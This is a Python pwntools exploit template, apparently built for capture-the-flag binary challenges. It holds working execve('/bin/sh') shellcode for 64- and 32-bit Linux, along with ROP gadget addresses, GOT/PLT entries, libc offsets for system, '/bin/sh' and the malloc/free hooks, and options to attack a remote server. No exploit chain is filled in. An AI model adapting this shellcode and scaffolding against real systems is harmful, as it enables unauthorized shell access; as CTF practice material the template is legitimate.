#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string
from ctypes import *

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
context.terminal = ['tmux','splitw','-h']

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #

SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = 'TEST/test'
binary = ELF(program_name)

remote_server = ''
PORT = None

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc_native = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        libc_native = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ================= OFFSETS & GADGETS & MAGIC ================== #
# ============================================================== #

# ============ PLT =========== #

__cxa_finalize_PLT = 0x1094
puts_PLT = 0x10a4
strlen_PLT = 0x10b4
__stack_chk_fail_PLT = 0x10c4
printf_PLT = 0x10d4
read_PLT = 0x10e4
__isoc99_scanf_PLT = 0x10f4

# ============ GOT =========== #

_ITM_deregisterTMCloneTable_GOT = 0x3fd8
__libc_start_main_GOT = 0x3fe0
__gmon_start___GOT = 0x3fe8
_ITM_registerTMCloneTable_GOT = 0x3ff0
__cxa_finalize_GOT = 0x3ff8
puts_GOT = 0x3fa8
strlen_GOT = 0x3fb0
__stack_chk_fail_GOT = 0x3fb8
printf_GOT = 0x3fc0
read_GOT = 0x3fc8
__isoc99_scanf_GOT = 0x3fd0

# ============ BINARY GADGETS =========== #

pop_rdi = 0x0000000000001313 # pop rdi; ret; 
pop_rsi = 0x0000000000001311 # pop rsi; pop r15; ret; 
pop_rbp = 0x000000000000130b # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x000000000000130f # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x00000000000011d3 # pop rbp; ret; 
pop_rsp = 0x000000000000130d # pop rsp; pop r13; pop r14; pop r15; ret; 
leave_ret = 0x000000000000129f # leave; ret; 

# ============ LIBC OFFSETS =========== #

__cxa_finalize_off = 0x4a090
puts_off = 0x875a0
strlen_off = 0xa27b0
__stack_chk_fail_off = 0x132b00
printf_off = 0x64e10
read_off = 0x111130
__isoc99_scanf_off = 0x66230

# ============ MAGIC =========== #

mal_hook_off = 0x1ebb70
free_hook_off = 0x1eeb28
system_off = 0x55410
binsh_off = 0x1b75aa

# ============ ONE GADGETS =========== #

one_gag = [ 0xe6c7e, 0xe6c81, 0xe6c84, 0 ] 


# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

sl = p.sendline
sla = p.sendlineafter
sa = p.sendafter
s = p.send

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":



    # ============ GDB =========== #
    gdb.attach(p)

    p.interactive()

# ============================================================== #
# =========================== NOTES =========================== #
# ============================================================== #